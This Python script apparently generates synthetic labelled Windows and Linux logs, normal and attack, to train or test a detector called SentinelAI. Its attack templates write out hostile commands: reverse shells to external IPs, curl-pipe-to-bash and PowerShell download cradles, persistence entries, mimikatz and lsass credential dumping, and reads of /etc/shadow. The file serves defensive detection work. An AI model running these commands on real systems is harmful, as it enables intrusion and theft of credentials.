# log_generator.py
# SentinelAI - Gerador de Logs Sintéticos
# Gera logs Windows e Linux (normais e de ataque) e organiza automaticamente nas pastas certas.

import os
import random
import json
from datetime import datetime, timedelta

# ============================================================
# CONFIGURAÇÃO
# ============================================================

OUTPUT_BASE = "logs"

STRUCTURE = {
    "normal":  ["windows", "linux"],
    "attack":  {
        "persistence":       ["windows", "linux"],
        "execution":         ["windows", "linux"],
        "lateral_movement":  ["windows", "linux"],
        "credential_access": ["windows", "linux"],
    }
}

HOSTS_WINDOWS = ["DESKTOP-ABC123", "WORKSTATION-01", "SRV-FINANCE", "PC-JOHN", "LAPTOP-HR"]
HOSTS_LINUX   = ["ubuntu-server", "kali-dev", "prod-web01", "db-server", "fileserver"]
USERS         = ["john.doe", "admin", "alice", "bob", "svc_backup", "guest"]
IPS_INTERNAL  = ["192.168.1.10", "192.168.1.20", "192.168.1.50", "10.0.0.5"]
IPS_EXTERNAL  = ["185.220.101.1", "45.33.32.156", "198.51.100.1", "203.0.113.42"]

# ============================================================
# UTILITÁRIOS
# ============================================================

def random_time(days_back: int = 30) -> str:
    base = datetime.now() - timedelta(days=random.randint(0, days_back),
                                      hours=random.randint(0, 23),
                                      minutes=random.randint(0, 59),
                                      seconds=random.randint(0, 59))
    return base.strftime("%Y-%m-%dT%H:%M:%S.000Z")

def syslog_time() -> str:
    base = datetime.now() - timedelta(days=random.randint(0, 30),
                                      hours=random.randint(0, 23))
    return base.strftime("%b %d %H:%M:%S")

def random_pid() -> int:
    return random.randint(1000, 65535)

def random_host(platform: str) -> str:
    return random.choice(HOSTS_WINDOWS if platform == "windows" else HOSTS_LINUX)

def random_user() -> str:
    return random.choice(USERS)

def save_logs(logs: list, category: str, subcategory: str, platform: str, filename: str):
    """Guarda logs no ficheiro correto e cria as pastas se não existirem."""
    if subcategory:
        folder = os.path.join(OUTPUT_BASE, category, subcategory, platform)
    else:
        folder = os.path.join(OUTPUT_BASE, category, platform)

    os.makedirs(folder, exist_ok=True)
    filepath = os.path.join(folder, filename)

    with open(filepath, "w", encoding="utf-8") as f:
        for log in logs:
            f.write(json.dumps(log, ensure_ascii=False) + "\n")

    print(f"  ✅ {len(logs):>3} logs → {filepath}")
    return filepath

# ============================================================
# LOGS NORMAIS — WINDOWS
# ============================================================

def gen_normal_windows(n: int = 80) -> list:
    normal_commands = [
        "C:\\Windows\\System32\\notepad.exe",
        "C:\\Windows\\explorer.exe",
        "C:\\Windows\\System32\\cmd.exe /c dir",
        "C:\\Windows\\System32\\ipconfig.exe /all",
        "C:\\Windows\\System32\\tasklist.exe",
        "C:\\Windows\\System32\\ping.exe google.com",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Windows\\System32\\mspaint.exe",
        "C:\\Windows\\System32\\calc.exe",
        "python.exe C:\\Projects\\script.py",
        "git.exe commit -m fix",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Process",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Service",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe Get-Date",
        "C:\\Windows\\System32\\svchost.exe -k netsvcs",
        "C:\\Windows\\System32\\services.exe",
        "C:\\Windows\\System32\\lsass.exe",
        "C:\\Windows\\System32\\spoolsv.exe",
    ]
    logs = []
    for _ in range(n):
        host = random_host("windows")
        user = random_user()
        cmd  = random.choice(normal_commands)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": host,
            "User": user,
            "Image": cmd.split()[0],
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "normal"
        })
    return logs

# ============================================================
# LOGS NORMAIS — LINUX
# ============================================================

def gen_normal_linux(n: int = 80) -> list:
    normal_cmds = [
        "ls -la /home",
        "cd /var/log",
        "cat /etc/hostname",
        "ps aux",
        "top -bn1",
        "df -h",
        "free -m",
        "whoami",
        "uname -a",
        "ping -c 4 8.8.8.8",
        "curl https://example.com",
        "apt-get update",
        "systemctl status nginx",
        "journalctl -n 50",
        "grep error /var/log/syslog",
        "python3 app.py",
        "git pull origin main",
        "nano /etc/hosts",
        "ssh user@192.168.1.10",
    ]
    logs = []
    for _ in range(n):
        host = random_host("linux")
        user = random_user()
        cmd  = random.choice(normal_cmds)
        logs.append({
            "source": "linux", "format": "json_synthetic",
            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
            "TimeCreated": random_time(),
            "Computer": host,
            "User": user,
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "normal"
        })
    return logs

# ============================================================
# ATTACK — PERSISTENCE — WINDOWS
# ============================================================

def gen_attack_persistence_windows(n: int = 40) -> list:
    templates = [
        lambda: {
            "EventID": "13", "EventType": "Registry Value Set (Sysmon)",
            "TargetObject": f"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{random.choice(['updater','svchost32','winlogon_helper'])}",
            "Details": f"C:\\Users\\{random_user()}\\AppData\\Roaming\\{random.choice(['malware.exe','payload.exe','backdoor.exe'])}",
            "Image": "C:\\Windows\\System32\\reg.exe",
            "CommandLine": f"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v malware /t REG_SZ /d C:\\malware.exe"
        },
        lambda: {
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "Image": "C:\\Windows\\System32\\schtasks.exe",
            "CommandLine": f"schtasks /create /tn {random.choice(['updater','svchelper','winupdate'])} /tr C:\\Windows\\Temp\\payload.exe /sc onlogon /ru SYSTEM",
        },
        lambda: {
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "Image": "C:\\Windows\\System32\\sc.exe",
            "CommandLine": f"sc create malservice binpath= C:\\malware.exe start= auto",
        },
    ]
    logs = []
    for _ in range(n):
        host = random_host("windows")
        template = random.choice(templates)
        entry = {
            "source": "windows", "format": "json_synthetic",
            "TimeCreated": random_time(),
            "Computer": host,
            "User": random_user(),
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Persistence",
            "mitre_technique": "T1547 - Boot or Logon Autostart Execution",
        }
        entry.update(template())
        logs.append(entry)
    return logs

# ============================================================
# ATTACK — PERSISTENCE — LINUX
# ============================================================

def gen_attack_persistence_linux(n: int = 40) -> list:
    templates = [
        f"(crontab -l; echo '@reboot /tmp/.hidden/backdoor') | crontab -",
        f"echo '/tmp/payload' >> /etc/rc.local",
        f"cp /tmp/payload /etc/init.d/sshd_helper && chmod +x /etc/init.d/sshd_helper",
        f"systemctl enable /tmp/malicious.service",
        f"echo 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1' >> /home/{random.choice(USERS)}/.bashrc",
    ]
    logs = []
    for _ in range(n):
        logs.append({
            "source": "linux", "format": "json_synthetic",
            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
            "TimeCreated": random_time(),
            "Computer": random_host("linux"),
            "User": random_user(),
            "CommandLine": random.choice(templates),
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Persistence",
            "mitre_technique": "T1053 - Scheduled Task/Job",
        })
    return logs

# ============================================================
# ATTACK — EXECUTION — WINDOWS
# ============================================================

def gen_attack_execution_windows(n: int = 40) -> list:
    templates = [
        f"powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAA=",
        f"powershell -nop -w hidden -enc UwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwA=",
        f"powershell.exe -c IEX(New-Object Net.WebClient).DownloadString('http://{random.choice(IPS_EXTERNAL)}/shell.ps1')",
        f"certutil.exe -urlcache -f http://{random.choice(IPS_EXTERNAL)}/payload.exe C:\\Windows\\Temp\\payload.exe",
        f"mshta.exe http://{random.choice(IPS_EXTERNAL)}/payload.hta",
        f"rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write()",
        f"wscript.exe C:\\Users\\Public\\payload.vbs",
        f"regsvr32 /s /n /u /i:http://{random.choice(IPS_EXTERNAL)}/payload.sct scrobj.dll",
        f"msiexec /q /i http://{random.choice(IPS_EXTERNAL)}/malware.msi",
        f"bitsadmin /transfer job /download /priority high http://{random.choice(IPS_EXTERNAL)}/a.exe C:\\temp\\a.exe",
    ]
    logs = []
    for _ in range(n):
        cmd = random.choice(templates)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": random_host("windows"),
            "User": random_user(),
            "Image": cmd.split()[0],
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Execution",
            "mitre_technique": "T1059 - Command and Scripting Interpreter",
        })
    return logs

# ============================================================
# ATTACK — EXECUTION — LINUX
# ============================================================

def gen_attack_execution_linux(n: int = 40) -> list:
    templates = [
        f"bash -i >& /dev/tcp/{random.choice(IPS_EXTERNAL)}/4444 0>&1",
        f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{random.choice(IPS_EXTERNAL)}\",4444))'",
        f"curl http://{random.choice(IPS_EXTERNAL)}/shell.sh | bash",
        f"wget -O- http://{random.choice(IPS_EXTERNAL)}/payload | sh",
        f"chmod +x /tmp/.hidden && /tmp/.hidden",
        f"nc -e /bin/bash {random.choice(IPS_EXTERNAL)} 4444",
        f"perl -e 'use Socket;$i=\"{random.choice(IPS_EXTERNAL)}\";socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'",
    ]
    logs = []
    for _ in range(n):
        logs.append({
            "source": "linux", "format": "json_synthetic",
            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
            "TimeCreated": random_time(),
            "Computer": random_host("linux"),
            "User": random_user(),
            "CommandLine": random.choice(templates),
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Execution",
            "mitre_technique": "T1059 - Command and Scripting Interpreter",
        })
    return logs

# ============================================================
# ATTACK — LATERAL MOVEMENT — WINDOWS
# ============================================================

def gen_attack_lateral_windows(n: int = 30) -> list:
    templates = [
        f"psexec.exe \\\\{random.choice(IPS_INTERNAL)} -u admin -p pass123 cmd.exe",
        f"wmic /node:{random.choice(IPS_INTERNAL)} process call create cmd.exe",
        f"net use \\\\{random.choice(IPS_INTERNAL)}\\IPC$ password /user:domain\\admin",
        f"powershell Invoke-Command -ComputerName {random.choice(IPS_INTERNAL)} -ScriptBlock {{whoami}}",
        f"smbclient \\\\{random.choice(IPS_INTERNAL)}\\C$ -U admin%pass123",
    ]
    logs = []
    for _ in range(n):
        cmd = random.choice(templates)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": random_host("windows"),
            "User": random_user(),
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Lateral Movement",
            "mitre_technique": "T1021 - Remote Services",
        })
    return logs

# ============================================================
# ATTACK — LATERAL MOVEMENT — LINUX
# ============================================================

def gen_attack_lateral_linux(n: int = 30) -> list:
    templates = [
        f"ssh -o StrictHostKeyChecking=no root@{random.choice(IPS_INTERNAL)}",
        f"scp /tmp/payload root@{random.choice(IPS_INTERNAL)}:/tmp/",
        f"rsync -avz /tmp/payload {random_user()}@{random.choice(IPS_INTERNAL)}:/tmp/",
        f"ssh root@{random.choice(IPS_INTERNAL)} 'bash -i >& /dev/tcp/{random.choice(IPS_EXTERNAL)}/4444 0>&1'",
    ]
    logs = []
    for _ in range(n):
        logs.append({
            "source": "linux", "format": "json_synthetic",
            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
            "TimeCreated": random_time(),
            "Computer": random_host("linux"),
            "User": random_user(),
            "CommandLine": random.choice(templates),
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Lateral Movement",
            "mitre_technique": "T1021.004 - SSH",
        })
    return logs

# ============================================================
# ATTACK — CREDENTIAL ACCESS — WINDOWS
# ============================================================

def gen_attack_credential_windows(n: int = 30) -> list:
    templates = [
        "mimikatz.exe sekurlsa::logonpasswords",
        "mimikatz.exe lsadump::sam",
        f"procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass_{random.randint(100,999)}.dmp",
        "rundll32.exe C:\\Windows\\System32\\comsvcs.dll MiniDump 624 C:\\temp\\lsass.dmp full",
        f"reg save HKLM\\SAM C:\\temp\\sam_{random.randint(100,999)}.hive",
        f"reg save HKLM\\SYSTEM C:\\temp\\system.hive",
        f"net user {random_user()} NewPass123! /add",
        f"net localgroup administrators {random_user()} /add",
    ]
    logs = []
    for _ in range(n):
        cmd = random.choice(templates)
        logs.append({
            "source": "windows", "format": "json_synthetic",
            "EventID": "1", "EventType": "Process Creation (Sysmon)",
            "TimeCreated": random_time(),
            "Computer": random_host("windows"),
            "User": random_user(),
            "Image": cmd.split()[0],
            "CommandLine": cmd,
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1003 - OS Credential Dumping",
        })
    return logs

# ============================================================
# ATTACK — CREDENTIAL ACCESS — LINUX
# ============================================================

def gen_attack_credential_linux(n: int = 30) -> list:
    templates = [
        "cat /etc/shadow",
        "unshadow /etc/passwd /etc/shadow > /tmp/hashes.txt",
        f"john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/hashes.txt",
        "cat /root/.ssh/id_rsa",
        "find / -name '*.pem' 2>/dev/null",
        f"hashcat -m 1800 /tmp/hashes.txt /usr/share/wordlists/rockyou.txt",
        "grep -r 'password' /var/www/html/ 2>/dev/null",
        "cat /home/*/.bash_history",
    ]
    logs = []
    for _ in range(n):
        logs.append({
            "source": "linux", "format": "json_synthetic",
            "EventID": "EXECVE", "EventType": "Auditd EXECVE",
            "TimeCreated": random_time(),
            "Computer": random_host("linux"),
            "User": random_user(),
            "CommandLine": random.choice(templates),
            "ProcessId": str(random_pid()),
            "label": "attack",
            "mitre_tactic": "Credential Access",
            "mitre_technique": "T1003 - OS Credential Dumping",
        })
    return logs

# ============================================================
# MAIN — Gerar e organizar tudo
# ============================================================

def main():
    print("=" * 55)
    print("  🛡️  SentinelAI — Gerador de Logs Sintéticos")
    print("=" * 55)
    print()

    generators = [
        # (função,                          category,  subcategory,        platform,    filename)
        (gen_normal_windows,               "normal",  None,               "windows",   "normal_windows.jsonl"),
        (gen_normal_linux,                 "normal",  None,               "linux",     "normal_linux.jsonl"),
        (gen_attack_persistence_windows,   "attack",  "persistence",      "windows",   "persistence_windows.jsonl"),
        (gen_attack_persistence_linux,     "attack",  "persistence",      "linux",     "persistence_linux.jsonl"),
        (gen_attack_execution_windows,     "attack",  "execution",        "windows",   "execution_windows.jsonl"),
        (gen_attack_execution_linux,       "attack",  "execution",        "linux",     "execution_linux.jsonl"),
        (gen_attack_lateral_windows,       "attack",  "lateral_movement", "windows",   "lateral_movement_windows.jsonl"),
        (gen_attack_lateral_linux,         "attack",  "lateral_movement", "linux",     "lateral_movement_linux.jsonl"),
        (gen_attack_credential_windows,    "attack",  "credential_access","windows",   "credential_access_windows.jsonl"),
        (gen_attack_credential_linux,      "attack",  "credential_access","linux",     "credential_access_linux.jsonl"),
    ]

    total = 0
    for gen_fn, category, subcategory, platform, filename in generators:
        logs = gen_fn()
        save_logs(logs, category, subcategory, platform, filename)
        total += len(logs)

    print()
    print(f"  📊 Total de logs gerados: {total}")
    print()
    print("  📁 Estrutura criada:")
    for root, dirs, files in os.walk(OUTPUT_BASE):
        level = root.replace(OUTPUT_BASE, "").count(os.sep)
        indent = "  " + "  " * level
        print(f"{indent}📂 {os.path.basename(root)}/")
        for f in files:
            subindent = "  " + "  " * (level + 1)
            print(f"{subindent}📄 {f}")

    print()
    print("  ✅ Pronto! Podes agora correr o sentinel.py")
    print("=" * 55)

if __name__ == "__main__":
    main()